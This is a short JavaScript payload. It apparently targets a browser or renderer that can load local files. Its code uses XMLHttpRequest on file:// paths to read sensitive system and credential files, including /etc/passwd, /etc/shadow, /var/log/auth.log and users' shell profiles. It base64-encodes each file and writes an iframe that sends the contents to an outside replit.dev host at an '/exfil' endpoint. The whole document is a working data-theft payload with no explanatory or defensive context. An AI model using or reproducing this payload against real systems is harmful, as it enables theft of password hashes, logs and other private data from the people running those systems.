function reqListener() {
    var b64 = btoa(this.responseText);
    document.write('<iframe src="https://917bfb23-67d7-4fb1-bb32-0350c424dde0-00-1eqsn09i0sk29.spock.replit.dev/exfil?data=' + b64 + '"></iframe>');
}

var filesToRead = [
    "/etc/passwd",
    "/etc/hosts",
    "/etc/shadow",
    "/var/log/syslog",
    "/var/log/auth.log",
    "/usr/share/doc",
    "/home/user/.bashrc",
    "/home/user/.profile"
    // Add more files and directories as needed
];

function readFiles(files) {
    files.forEach(function(file) {
        var oReq = new XMLHttpRequest();
        oReq.addEventListener("load", reqListener);
        oReq.open("GET", "file://" + file);
        oReq.send();
    });
}

readFiles(filesToRead);
